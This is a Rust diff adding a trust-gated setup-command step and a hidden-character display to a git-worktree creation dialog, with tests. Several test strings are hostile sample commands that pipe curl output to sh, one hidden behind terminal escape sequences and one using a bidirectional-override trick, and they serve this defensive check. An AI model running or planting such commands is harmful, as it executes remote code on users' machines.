@@ -10,14 +10,23 @@
 //!
 //! The form is checked here as a pure function (`check`) so nothing obviously wrong is sent; the
 //! agent's refusals come back as `Problem`s and are shown next to the field they are about.
+//!
+//! The repository's recipe (`protocol::Recipe`, in the plan) is shown before creating: each
+//! pattern with what it matches now, and the full `setup` command. The agent applies the copies
+//! and links itself; `setup` runs in the new card, before its template command, only when ticked,
+//! and the tick starts off until the user accepted that exact command for that repository once
+//! (`Trust`).
 
 use std::sync::atomic::{AtomicU64, Ordering};
 use std::time::{Duration, Instant};
 
 use egui::{Color32, ComboBox, Id, Key, Modal, Modifiers, Popup, RichText, TextEdit, Ui};
-use protocol::{AgentCmd, AgentEvent, CreateWorktree, DEFAULT_WORKTREE_LOCATION, Problem, WorktreeBranch, WorktreePlan, folder_for_branch, parse_location, valid_folder};
+use protocol::{
+    AgentCmd, AgentEvent, CreateWorktree, DEFAULT_WORKTREE_LOCATION, Problem, RECIPE_FILE, Recipe, RecipePattern, WorktreeBranch, WorktreePlan, folder_for_branch, parse_location, valid_folder,
+};
 
 use super::cleanup::PENDING_TIMEOUT;
+use super::trust::Trust;
 use crate::shell::event::Event;
 use crate::shell::i18n::t;
 use crate::shell::theme;
@@ -239,6 +248,19 @@ pub fn plan_due(asked: Option<&Asked>, wanted: (&str, Option<&str>), since: Inst
     }
 }
 
+/// The recipe's setup command to run in the new card: only when the recipe has one and the tick
+/// is on. The tick is the user's `choice` (main checkout, command, ticked) while it is about this
+/// very command; otherwise on only if `trust` already accepted it for this repository.
+pub fn setup_to_run(recipe: Option<&Recipe>, choice: Option<&(String, String, bool)>, trust: &Trust) -> Option<String> {
+    let recipe = recipe?;
+    let setup = recipe.setup.as_deref()?;
+    let ticked = match choice {
+        Some((main, command, ticked)) if *main == recipe.main && command == setup => *ticked,
+        _ => trust.accepted(&recipe.main, setup),
+    };
+    ticked.then(|| setup.to_string())
+}
+
 /// A creation sent to the agent: kept by the slice until its final answer, whatever became of
 /// the dialog.
 #[derive(Clone, Debug, PartialEq, Eq)]
@@ -247,26 +269,51 @@ pub struct Sent {
     pub project: ProjectId,
     /// What the new card starts with.
     pub command: Option<String>,
+    /// The recipe's setup command, ticked: run first in the new card (and accepted for `repo` once
+    /// the creation went through).
+    pub setup: Option<String>,
+    /// The main checkout the setup command comes from.
+    pub repo: Option<String>,
     /// The location used, saved with the group once it went through.
     pub location: Option<String>,
 }
 
+impl Sent {
+    /// The new card runs something (a setup or a template command): it must wait for the
+    /// recipe's copies and links.
+    pub fn starts_something(&self) -> bool {
+        self.setup.is_some() || self.command.is_some()
+    }
+}
+
 /// What an answer to a creation leads to: the events to send, and whether to keep waiting (git
-/// still running: the final answer follows). Created: the card opens in the new folder and the
-/// location is saved with the group; the group gone meanwhile: a notice names the folder.
-pub fn on_created(sent: &Sent, path: Option<&str>, problem: Option<&Problem>, world: &World) -> (Vec<Event>, bool) {
+/// still running: the final answer follows). Created: the location is saved with the group and
+/// the card opens in the new folder, unless `hold` (it opens once the recipe is applied,
+/// `open_card`).
+pub fn on_created(sent: &Sent, path: Option<&str>, problem: Option<&Problem>, hold: bool, world: &World) -> (Vec<Event>, bool) {
     match (path, problem) {
         (_, Some(Problem::GitStillRunning { .. })) => (Vec::new(), true),
-        (Some(path), None) if world.project(&sent.project).is_some() => (
-            vec![
-                Event::SetProjectWorktreeLocation(sent.project.clone(), sent.location.clone()),
-                Event::NewCard { at: None, project: Some(sent.project.clone()), command: sent.command.clone(), cwd: Some(path.to_string()) },
-            ],
-            false,
-        ),
-        (Some(path), None) => (vec![Event::Inform { title: t().worktree_created_title.into(), body: (t().worktree_group_gone)(path) }], false),
+        (Some(path), None) => {
+            let mut events = Vec::new();
+            if world.project(&sent.project).is_some() {
+                events.push(Event::SetProjectWorktreeLocation(sent.project.clone(), sent.location.clone()));
+            }
+            if !hold {
+                events.extend(open_card(sent, path, world));
+            }
+            (events, false)
+        }
         _ => (Vec::new(), false),
     }
+}
+
+/// The card of a worktree created: in its group, with its start; the group gone meanwhile: a
+/// notice names the folder.
+pub fn open_card(sent: &Sent, path: &str, world: &World) -> Vec<Event> {
+    if world.project(&sent.project).is_none() {
+        return vec![Event::Inform { title: t().worktree_created_title.into(), body: (t().worktree_group_gone)(path) }];
+    }
+    vec![Event::NewCard { at: None, project: Some(sent.project.clone()), command: sent.command.clone(), setup: sent.setup.clone(), cwd: Some(path.to_string()) }]
 }
 
 /// The creation this dialog sent, not answered for good yet.
@@ -292,6 +339,8 @@ pub struct CreateDialog {
     pub template: Option<usize>,
     /// Add the location to `info/exclude` (off unless the user ticks it).
     pub exclude: bool,
+    /// The setup tick, as the user set it: (main checkout, command, ticked).
+    pub setup_choice: Option<(String, String, bool)>,
     plan: Option<WorktreePlan>,
     asked: Option<Asked>,
     /// The (folder, location) wanted, and since when.
@@ -317,6 +366,7 @@ impl CreateDialog {
             folder_choice: None,
             template: None,
             exclude: false,
+            setup_choice: None,
             plan: None,
             asked: None,
             wanted: None,
@@ -349,6 +399,11 @@ impl CreateDialog {
         };
         let base = self.base.clone().or_else(|| self.plan.as_ref().and_then(|p| p.default_branch.clone())).unwrap_or_default();
         Form { mode: self.mode, name: self.name.clone(), base, existing: self.existing.clone(), location: self.location.trim().to_string(), folder }
+    }
+
+    /// The repository's recipe, from the last plan.
+    pub fn recipe(&self) -> Option<&Recipe> {
+        self.plan.as_ref()?.recipe.as_ref()
     }
 
     /// The plan, when it is about the form's folder and location.
@@ -425,8 +480,9 @@ impl CreateDialog {
         }
     }
 
-    /// Sends the creation, if the form is right: what the slice keeps until its answer.
-    pub fn submit(&mut self, world: &World, events: &mut Vec<Event>, now: Instant) -> Option<Sent> {
+    /// Sends the creation, if the form is right: what the slice keeps until its answer (which
+    /// remembers a ticked setup command as accepted once the creation went through).
+    pub fn submit(&mut self, world: &World, trust: &Trust, events: &mut Vec<Event>, now: Instant) -> Option<Sent> {
         let form = self.form();
         let plan = self.plan_for(&form);
         let exclude = self.exclude && plan.is_some_and(|p| p.exclude.is_some());
@@ -435,13 +491,15 @@ impl CreateDialog {
             return None;
         }
         let command = self.template.and_then(|i| world.project(&self.project)?.templates.get(i)).map(|tpl| tpl.command.clone());
+        let setup = setup_to_run(self.recipe(), self.setup_choice.as_ref(), trust);
+        let repo = setup.as_ref().and(self.recipe()).map(|r| r.main.clone());
         let id = next_id();
         let location = request.location.clone();
         events.push(Event::ToAgent(AgentCmd::CreateWorktree { id, key: self.project.clone(), request }));
         self.pending = Some(Pending { id, at: now, running: false });
         self.refused = None;
         self.no_answer = false;
-        Some(Sent { id, project: self.project.clone(), command, location })
+        Some(Sent { id, project: self.project.clone(), command, setup, repo, location })
     }
 
     /// The problems to show next to `field`: the form's own, then the agent's refusal of this very
@@ -466,7 +524,7 @@ impl CreateDialog {
     }
 
     /// Draws the dialog; creations sent go to `sent`. `false`: closed (a creation sent goes on).
-    pub fn ui(&mut self, ctx: &egui::Context, world: &World, events: &mut Vec<Event>, sent: &mut Vec<Sent>) -> bool {
+    pub fn ui(&mut self, ctx: &egui::Context, world: &World, trust: &Trust, events: &mut Vec<Event>, sent: &mut Vec<Sent>) -> bool {
         let now = Instant::now();
         // Escape closes an open drop-down list first, the dialog only after.
         let list_open = Popup::is_any_open(ctx);
@@ -485,7 +543,10 @@ impl CreateDialog {
             ui.label(RichText::new((t().new_worktree_title)(&group)).strong().size(16.0));
             ui.add_space(6.0);
             let busy = self.pending.is_some();
-            ui.add_enabled_ui(!busy, |ui| self.fields(ui, &templates));
+            ui.add_enabled_ui(!busy, |ui| {
+                self.fields(ui, &templates);
+                self.recipe_ui(ui, trust);
+            });
             let form = self.form();
             let plan = self.plan_for(&form);
             let issues = check(&form, plan);
@@ -520,7 +581,7 @@ impl CreateDialog {
             }
         });
         if submit {
-            sent.extend(self.submit(world, events, now));
+            sent.extend(self.submit(world, trust, events, now));
         }
         if !list_open && ctx.input_mut(|i| i.consume_key(Modifiers::NONE, Key::Escape)) {
             open = false;
@@ -604,6 +665,43 @@ impl CreateDialog {
         });
     }
 
+    /// What the repository's recipe will do: the patterns with their matches now, the setup
+    /// command in full, and its tick.
+    fn recipe_ui(&mut self, ui: &mut Ui, trust: &Trust) {
+        let Some(recipe) = self.recipe().cloned() else { return };
+        ui.add_space(8.0);
+        ui.separator();
+        ui.label(RichText::new((t().recipe_title)(RECIPE_FILE)).strong());
+        if let Some(problem) = &recipe.problem {
+            ui.label(RichText::new(t().problem(problem)).color(ERROR));
+        }
+        egui::ScrollArea::vertical().id_salt("new-worktree-recipe").max_height(160.0).show(ui, |ui| {
+            for (line, color) in recipe_lines(&recipe) {
+                ui.label(RichText::new(line).color(color));
+            }
+        });
+        let Some(setup) = recipe.setup.clone() else { return };
+        ui.add_space(4.0);
+        let shown = visible_setup(&setup);
+        ui.label(format!("{} ({})", t().recipe_setup_label, (t().recipe_setup_lines)(shown.lines().count().max(1))));
+        // Exactly the text that would run, every line of it, anything invisible spelled out; in
+        // its own scroll area so a long one never pushes the tick and the buttons away.
+        egui::Frame::new().fill(theme::CARD_BG).inner_margin(6.0).show(ui, |ui| {
+            egui::ScrollArea::vertical().id_salt("new-worktree-setup").max_height(140.0).show(ui, |ui| {
+                ui.add(egui::Label::new(RichText::new(&shown).monospace().color(theme::TEXT)).wrap());
+            });
+        });
+        let mut ticked = setup_to_run(Some(&recipe), self.setup_choice.as_ref(), trust).is_some();
+        if ui.checkbox(&mut ticked, t().recipe_setup_tick).changed() {
+            self.setup_choice = Some((recipe.main.clone(), setup.clone(), ticked));
+        }
+        if ticked {
+            ui.label(RichText::new(t().recipe_setup_warning).small().color(WARNING));
+        } else {
+            ui.label(RichText::new(t().recipe_setup_off).color(theme::TEXT_DIM));
+        }
+    }
+
     fn existing_ui(&mut self, ui: &mut Ui) {
         let free: Vec<String> = self.plan.as_ref().map(|p| free_branches(p).into_iter().map(String::from).collect()).unwrap_or_default();
         if self.plan.is_some() && free.is_empty() {
@@ -649,6 +747,46 @@ impl CreateDialog {
     }
 }
 
+/// The setup command as the dialog shows it: line breaks as the card's shell gets them (`\r\n`
+/// and a lone `\r` become `\n`), then every character that would not show for what it is
+/// (control characters, escape sequences, tabs, bidirectional and zero-width marks) spelled out
+/// as `⟨U+XXXX⟩`; a `⟨` of the text itself too, so nothing shown can pass for something else.
+pub fn visible_setup(text: &str) -> String {
+    let text = text.replace("\r\n", "\n").replace('\r', "\n");
+    let hidden = |c: char| {
+        (c.is_control() && c != '\n')
+            || matches!(c, '\u{00ad}' | '\u{061c}' | '\u{180e}' | '\u{200b}'..='\u{200f}' | '\u{2028}'..='\u{202e}' | '\u{2060}'..='\u{206f}' | '\u{feff}' | '\u{fff9}'..='\u{fffb}' | '\u{27e8}')
+    };
+    let mut out = String::with_capacity(text.len());
+    for c in text.chars() {
+        if hidden(c) {
+            out.push_str(&format!("\u{27e8}U+{:04X}\u{27e9}", c as u32));
+        } else {
+            out.push(c);
+        }
+    }
+    out
+}
+
+/// One line per recipe pattern, as the dialog shows them: copies, then links (with their
+/// matches now, or why they are refused).
+pub fn recipe_lines(recipe: &Recipe) -> Vec<(String, Color32)> {
+    let line = |p: &RecipePattern, text: fn(&str, usize) -> String| match p.refused {
+        Some(issue) => ((t().recipe_pattern_refused)(&p.pattern, t().pattern_issue(issue)), ERROR),
+        None => {
+            let mut s = text(&p.pattern, p.matches);
+            if p.claude {
+                s = format!("{s} - {}", t().recipe_from_claude);
+            }
+            if p.incomplete {
+                s = format!("{s} - {}", t().recipe_incomplete);
+            }
+            (s, if p.matches == 0 { theme::TEXT_DIM } else { theme::TEXT })
+        }
+    };
+    recipe.copy.iter().map(|p| line(p, t().recipe_copy_line)).chain(recipe.symlink.iter().map(|p| line(p, t().recipe_link_line))).collect()
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -674,6 +812,7 @@ mod tests {
             problem: None,
             free_folder: None,
             exclude: None,
+            recipe: None,
         }
     }
 
@@ -842,15 +981,15 @@ mod tests {
         d.template = Some(0);
         d.exclude = true;
         let mut sent = vec![];
-        let first_sent = d.submit(&world, &mut sent, t0).expect("sent");
-        assert!(d.submit(&world, &mut sent, t0).is_none(), "once");
-        assert_eq!(first_sent, Sent { id: first_sent.id, project: "p".into(), command: Some("claude".into()), location: None });
+        let first_sent = d.submit(&world, &Trust::default(), &mut sent, t0).expect("sent");
+        assert!(d.submit(&world, &Trust::default(), &mut sent, t0).is_none(), "once");
+        assert_eq!(first_sent, Sent { id: first_sent.id, project: "p".into(), command: Some("claude".into()), setup: None, repo: None, location: None });
         let Event::ToAgent(AgentCmd::CreateWorktree { id, request, .. }) = &sent[0] else { panic!("a creation") };
         assert_eq!(*id, first_sent.id);
         assert!(!request.exclude, "the plan found the folder ignored: nothing to add");
         // Refused: said next to its field while the form is the same.
         let refusal = Problem::BranchExists { branch: "feat/invoices".into() };
-        assert!(!d.handle(&AgentEvent::WorktreeCreated { id: *id, key: "p".into(), path: None, problem: Some(refusal.clone()), excluded: false }));
+        assert!(!d.handle(&AgentEvent::WorktreeCreated { id: *id, key: "p".into(), path: None, problem: Some(refusal.clone()), excluded: false, recipe_pending: false }));
         assert!(!d.creating());
         let f = d.form();
         assert_eq!(d.problems(&f, &check(&f, d.plan_for(&f)), Field::Branch), vec![refusal]);
@@ -867,12 +1006,12 @@ mod tests {
         d.name = "a".into();
         d.ask_plan(&mut vec![], t0);
         answer(&mut d, "a");
-        let sent = d.submit(&world, &mut vec![], t0).unwrap();
-        let still = AgentEvent::WorktreeCreated { id: sent.id, key: "p".into(), path: None, problem: Some(Problem::GitStillRunning { secs: 60 }), excluded: false };
+        let sent = d.submit(&world, &Trust::default(), &mut vec![], t0).unwrap();
+        let still = AgentEvent::WorktreeCreated { id: sent.id, key: "p".into(), path: None, problem: Some(Problem::GitStillRunning { secs: 60 }), excluded: false, recipe_pending: false };
         assert!(!d.handle(&still));
         d.expire(t0 + PENDING_TIMEOUT * 3);
         assert!(d.creating() && !d.no_answer, "git is working: no expiry");
-        let done = AgentEvent::WorktreeCreated { id: sent.id, key: "p".into(), path: Some("/w".into()), problem: None, excluded: false };
+        let done = AgentEvent::WorktreeCreated { id: sent.id, key: "p".into(), path: Some("/w".into()), problem: None, excluded: false, recipe_pending: false };
         assert!(d.handle(&done), "done");
     }
 
@@ -880,21 +1019,21 @@ mod tests {
     fn any_success_opens_the_card_whatever_became_of_the_dialog() {
         i18n::set(Lang::Fr);
         let world = shop();
-        let sent = Sent { id: 4, project: "p".into(), command: Some("claude".into()), location: Some("../{repo}-{name}".into()) };
+        let sent = Sent { id: 4, project: "p".into(), command: Some("claude".into()), setup: None, repo: None, location: Some("../{repo}-{name}".into()) };
         let path = "/home/me/shop-a";
-        let (events, keep) = on_created(&sent, Some(path), None, &world);
+        let (events, keep) = on_created(&sent, Some(path), None, false, &world);
         assert!(!keep);
         assert!(
-            matches!(&events[..], [Event::SetProjectWorktreeLocation(p, Some(l)), Event::NewCard { at: None, project: Some(g), command: Some(c), cwd: Some(cwd) }] if p == "p" && l == "../{repo}-{name}" && g == "p" && c == "claude" && cwd == path),
+            matches!(&events[..], [Event::SetProjectWorktreeLocation(p, Some(l)), Event::NewCard { at: None, project: Some(g), command: Some(c), setup: None, cwd: Some(cwd) }] if p == "p" && l == "../{repo}-{name}" && g == "p" && c == "claude" && cwd == path),
             "{events:?}"
         );
         // Still running: keep waiting for the final answer.
-        let (events, keep) = on_created(&sent, None, Some(&Problem::GitStillRunning { secs: 60 }), &world);
+        let (events, keep) = on_created(&sent, None, Some(&Problem::GitStillRunning { secs: 60 }), false, &world);
         assert!(events.is_empty() && keep);
         // Refused: nothing to open.
-        assert_eq!(on_created(&sent, None, Some(&Problem::BranchExists { branch: "a".into() }), &world).0.len(), 0);
+        assert_eq!(on_created(&sent, None, Some(&Problem::BranchExists { branch: "a".into() }), false, &world).0.len(), 0);
         // The group went meanwhile: a notice names the folder.
-        let (events, _) = on_created(&sent, Some(path), None, &World::default());
+        let (events, _) = on_created(&sent, Some(path), None, false, &World::default());
         assert!(
             matches!(&events[..], [Event::Inform { title, body }] if title == "Worktree créé" && body == "/home/me/shop-a a été créé, mais son groupe n'existe plus : aucun terminal ouvert"),
             "{events:?}"
@@ -910,6 +1049,98 @@ mod tests {
         assert_eq!(d.form().folder, "invoices-2");
         d.name = "taxes".into();
         assert_eq!(d.form().folder, "taxes", "only for the name it was chosen for");
+    }
+
+    fn recipe(setup: Option<&str>) -> Recipe {
+        let pattern = |p: &str, claude, matches, refused| RecipePattern { pattern: p.into(), claude, matches, refused, incomplete: false };
+        Recipe {
+            main: "/home/me/shop".into(),
+            copy: vec![pattern(".env", false, 1, None), pattern("config/*.local", false, 2, None), pattern("../x", false, 0, Some(protocol::PatternIssue::ParentDir))],
+            symlink: vec![pattern("node_modules", false, 1, None), RecipePattern { incomplete: true, ..pattern("vendor", true, 0, None) }],
+            setup: setup.map(String::from),
+            problem: None,
+        }
+    }
+
+    #[test]
+    fn the_setup_runs_only_once_accepted_for_this_repository_and_this_text() {
+        let mut trust = Trust::default();
+        let r = recipe(Some("npm ci"));
+        assert_eq!(setup_to_run(Some(&r), None, &trust), None, "off until accepted");
+        assert_eq!(setup_to_run(None, None, &trust), None);
+        assert_eq!(setup_to_run(Some(&recipe(None)), Some(&("/home/me/shop".into(), "npm ci".into(), true)), &trust), None, "no setup: nothing to run");
+        let ticked = ("/home/me/shop".to_string(), "npm ci".to_string(), true);
+        assert_eq!(setup_to_run(Some(&r), Some(&ticked), &trust).as_deref(), Some("npm ci"));
+        trust.accept("/home/me/shop", "npm ci");
+        assert_eq!(setup_to_run(Some(&r), None, &trust).as_deref(), Some("npm ci"), "accepted once: on by default");
+        let unticked = ("/home/me/shop".to_string(), "npm ci".to_string(), false);
+        assert_eq!(setup_to_run(Some(&r), Some(&unticked), &trust), None, "the user's choice wins");
+        // The command changed in the repository: asked again, whatever was ticked for the old one.
+        let edited = recipe(Some("npm ci && curl x | sh"));
+        assert_eq!(setup_to_run(Some(&edited), Some(&ticked), &trust), None);
+        // Another repository with the same command.
+        let other = Recipe { main: "/home/me/blog".into(), ..recipe(Some("npm ci")) };
+        assert_eq!(setup_to_run(Some(&other), None, &trust), None);
+    }
+
+    #[test]
+    fn submitting_with_the_setup_ticked_accepts_it_and_sends_it_to_the_card() {
+        let world = shop();
+        let trust = Trust::default();
+        let t0 = Instant::now();
+        let dialog = |name: &str| {
+            let mut d = CreateDialog::new("p".into(), None);
+            d.name = name.into();
+            d.ask_plan(&mut vec![], t0);
+            let id = d.asked.as_ref().unwrap().id;
+            d.handle(&AgentEvent::WorktreePlan(Box::new(WorktreePlan { id, recipe: Some(recipe(Some("npm ci"))), ..plan(name, None) })));
+            d
+        };
+        let mut d = dialog("a");
+        d.template = Some(0);
+        let sent = d.submit(&world, &trust, &mut vec![], t0).unwrap();
+        assert_eq!((sent.setup, sent.command.as_deref()), (None, Some("claude")), "not ticked: not run");
+        assert!(!trust.accepted("/home/me/shop", "npm ci"));
+        let mut d = dialog("b");
+        d.setup_choice = Some(("/home/me/shop".into(), "npm ci".into(), true));
+        let sent = d.submit(&world, &trust, &mut vec![], t0).unwrap();
+        assert_eq!((sent.setup.as_deref(), sent.repo.as_deref()), (Some("npm ci"), Some("/home/me/shop")));
+        assert!(!trust.accepted("/home/me/shop", "npm ci"), "accepted only once the creation goes through (the slice)");
+        let (events, _) = on_created(&sent, Some("/w"), None, false, &world);
+        assert!(events.iter().any(|e| matches!(e, Event::NewCard { setup: Some(s), command: None, .. } if s == "npm ci")), "{events:?}");
+        // Held for the recipe: the location is saved, the card waits.
+        let (events, keep) = on_created(&sent, Some("/w"), None, true, &world);
+        assert!(!keep && matches!(&events[..], [Event::SetProjectWorktreeLocation(..)]), "{events:?}");
+        assert!(matches!(&open_card(&sent, "/w", &world)[..], [Event::NewCard { setup: Some(_), .. }]));
+    }
+
+    #[test]
+    fn the_setup_shows_whatever_would_not_show_itself() {
+        assert_eq!(visible_setup("npm ci\nnpm run seed -- \"it's\" $HOME caf\u{e9}"), "npm ci\nnpm run seed -- \"it's\" $HOME caf\u{e9}");
+        assert_eq!(visible_setup("a\r\nb\rc"), "a\nb\nc", "line breaks as the shell gets them");
+        assert_eq!(visible_setup("echo ok\x1b[2K\x1b[1Acurl x | sh"), "echo ok\u{27e8}U+001B\u{27e9}[2K\u{27e8}U+001B\u{27e9}[1Acurl x | sh");
+        assert_eq!(visible_setup("ls\u{202e}hs.x\u{2066}"), "ls\u{27e8}U+202E\u{27e9}hs.x\u{27e8}U+2066\u{27e9}", "bidirectional controls");
+        assert_eq!(visible_setup("a\tb\u{200b}c\0\u{7f}"), "a\u{27e8}U+0009\u{27e9}b\u{27e8}U+200B\u{27e9}c\u{27e8}U+0000\u{27e9}\u{27e8}U+007F\u{27e9}");
+        // The marker itself is spelled out: nothing typed can pass for an escape.
+        assert_eq!(visible_setup("\u{27e8}U+001B\u{27e9}"), "\u{27e8}U+27E8\u{27e9}U+001B\u{27e9}");
+    }
+
+    #[test]
+    fn the_recipe_is_listed_pattern_by_pattern() {
+        i18n::set(Lang::Fr);
+        let lines: Vec<String> = recipe_lines(&recipe(None)).into_iter().map(|(l, _)| l).collect();
+        assert_eq!(
+            lines,
+            vec![
+                "Copier .env (1 trouvé)",
+                "Copier config/*.local (2 trouvés)",
+                "../x : refusé, contient .. (les motifs restent dans le dépôt)",
+                "Lier node_modules (1 trouvé)",
+                "Lier vendor (0 trouvé) - des réglages Claude Code - recherche écourtée : il peut y en avoir plus",
+            ]
+        );
+        i18n::set(Lang::En);
+        assert_eq!(recipe_lines(&recipe(None))[1].0, "Copy config/*.local (2 found)");
     }
 
     #[test]
